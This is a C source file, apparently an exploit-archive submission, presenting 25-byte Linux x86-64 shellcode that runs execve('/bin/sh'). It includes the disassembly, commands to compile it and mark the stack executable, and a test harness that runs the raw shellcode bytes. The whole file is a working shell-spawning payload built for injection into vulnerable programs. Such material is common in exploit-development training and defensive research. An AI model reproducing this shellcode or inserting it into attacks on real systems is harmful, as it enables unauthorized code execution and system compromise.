/*
---------------------------------------------------------------------------------------------------

Linux/x86_x64 - execve(/bin/sh) - 25 bytes

Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

Thanks for Unknown Commented in my Blog

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

0000000000400080 <.text>:
  400080:	eb 0b                	jmp    0x40008d
  400082:	5f                   	pop    rdi
  400083:	48 31 d2             	xor    rdx,rdx
  400086:	52                   	push   rdx
  400087:	5e                   	pop    rsi
  400088:	6a 3b                	push   0x3b
  40008a:	58                   	pop    rax
  40008b:	0f 05                	syscall
  40008d:	e8 f0 ff ff ff       	call   0x400082
  400092:	2f                   	(bad)
  400093:	62                   	(bad)
  400094:	69                   	.byte 0x69
  400095:	6e                   	outs   dx,BYTE PTR ds:[rsi]
  400096:	2f                   	(bad)
  400097:	73 68                	jae    0x400101
---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o sh_shell sh_shell.c
$ execstack -s sh_shell
$ ./sh_shell

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}